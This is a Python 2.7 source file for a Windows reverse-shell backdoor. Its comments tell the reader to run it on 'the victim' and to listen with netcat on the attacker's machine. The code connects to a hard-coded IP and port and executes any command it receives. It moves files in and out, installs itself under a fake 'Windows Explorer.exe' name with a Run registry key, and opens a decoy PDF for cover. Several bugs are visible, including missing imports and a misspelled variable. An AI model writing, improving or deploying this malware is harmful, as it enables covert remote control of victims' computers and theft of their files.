#!/usr/bin/env python
'''
    COMPATIBLE VERSION:
        python2.7
        For Windows
    RUN THIS PROGRAM ON THE VICTIM
    RUN THE FOLLOWING ON THE HACKER MACHINE, to listen on a port
        nc -vv -l -p port_num
        nc -vv -l -p 8080
    NOTE:
        The current ip is the kali ip
'''

import socket
import subprocess
import json
import os
import base64
import shutil

class Backdoor:
    #Class Attributes
    #   1)connection
    def __init__(self, ip, port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect(("192.168.8.128", 4444))
    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_loaction)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d "' + evil_file_loaction + '"', shell = True)
    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)
    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
    def execute_system_command(self, command):
        #Add the following if using python 2.7
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
    def change_working_directory(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful."
    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command_result == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Error during command execution."
            self.reliable_send(command_result)

def run_everything(filename="\sample.pdf"):
    file_name = sys._MEIPASS + filename
    subprocess.Popen(file_name, shell=True)

    try:
        time.sleep(25)
        my_backdoor = Backdoor("192.168.8.128", 4444)
        my_backdoor.run()
    except Exception:
        sys.exit()